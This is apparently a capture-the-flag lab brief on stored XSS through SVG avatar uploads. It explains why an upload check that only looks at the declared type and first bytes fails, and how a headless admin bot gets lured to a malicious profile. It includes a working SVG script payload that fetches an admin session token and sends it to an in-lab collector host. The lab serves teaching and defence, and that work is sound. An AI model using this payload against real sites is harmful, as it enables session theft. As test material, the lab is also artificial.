# Stored XSS via SVG Avatar Upload (`image/svg+xml` + `<object>`)

> Track: `xss` · Difficulty: **practitioner** · ~40 min · Free hints.

## Scenario

**Avatar Yard** lets members upload an avatar and share a profile page. To
support crisp, scalable avatars it accepts **SVG**. The upload handler
"validates" a file two ways, and both are cosmetic:

1. the multipart part's declared `Content-Type` must be `image/svg+xml`, and
2. the file bytes must **start with `<svg`**.

That is the whole check. It never strips `<script>` elements or event handlers
from the SVG body. Whatever you upload is stored verbatim and later handed back:

- `GET /avatars/<uuid>.svg` serves your bytes with `Content-Type: image/svg+xml`
  — a real **SVG document**; and
- `GET /u/<uuid>` (the public profile page) embeds that avatar with

  ```html
  <object data="/avatars/<uuid>.svg" type="image/svg+xml" width="200" height="200"></object>
  ```

  — an `<object>`, **not** an `<img>`.

An SVG is not just a picture: served as `image/svg+xml` and loaded **as a
document** (which is what `<object>`, `<iframe>` and direct navigation do), it is
an HTML/JS execution context in the page's own origin. An `<img src="…svg">`
would rasterise the same file and never run its scripts — but this profile page
uses `<object>`.

## The victim

You are not the target. The shop's **admin** is a headless-Chromium bot (the
shared `@websec-lab/xss-verifier`) that:

- logs in via `GET /internal/bot-login?k=<BOT_KEY>` so the app `Set-Cookie`s the
  admin `session` cookie into its browser, then
- polls `GET /internal/queue` for paths submitted through the public
  `POST /report` form and **visits each one**, every couple of seconds.

Both `/internal/*` endpoints are firewalled to the internal backend network, so
you cannot request the admin cookie or read the queue yourself — you must get the
admin's browser to run your code.

## Objective

There is an admin-only endpoint:

```
GET /admin/token      → 403 for you; returns the 32-hex admin session for a request
                        that carries the admin `session` cookie
```

You cannot call it directly. But a script running **in the app's origin** can:
a same-origin `fetch('/admin/token')` sends the admin cookie automatically. So
plant that script in an SVG avatar, get it embedded on a profile via `<object>`,
and have the admin bot load the profile:

```
<svg xmlns="http://www.w3.org/2000/svg"><script>
  fetch('/admin/token').then(r=>r.text()).then(t=>{
    new Image().src='http://collector:9000/report?t='+encodeURIComponent(t)});
</script></svg>
```

The `new Image().src=…` beacon reaches the in-lab **collector** on an internal,
**egress-dropped** network — it can receive the token but never route it to the
internet, so this lab ships a real exfil primitive at `risk: low`. Read what it
captured through the app's proxy:

```
GET /oob/received
```

then submit the recovered token:

```
POST /solve   {"c":"<32 hex>"}
```

`/solve` returns `FLAG{<64 hex>}` when the value matches the session the admin
bot currently holds.

## Getting Started

1. Upload an SVG avatar (`POST /avatar`, multipart field `avatar`, Content-Type
   `image/svg+xml`, body starting with `<svg`). Note the returned `/u/<uuid>`.
2. Load `/u/<uuid>` yourself and view source: your avatar is embedded with
   `<object type="image/svg+xml">`. What runs when the browser loads that
   document? Why would `<img>` have been safe?
3. Your own browser has no admin cookie, so `/admin/token` 403s for you. Whose
   browser holds it, and what feature hands that browser a URL of your choosing?
4. A script running in the app origin can `fetch('/admin/token')` with the
   cookie attached. How do you get the response out to a host you can read?

**CWE-79 (Improper Neutralization of Input During Web Page Generation) / OWASP
A03:2021 – Injection.** The fixes — never serve user SVG as an executable
document, sanitise the markup, and a script-blocking CSP — are in `SOLUTION.md`.
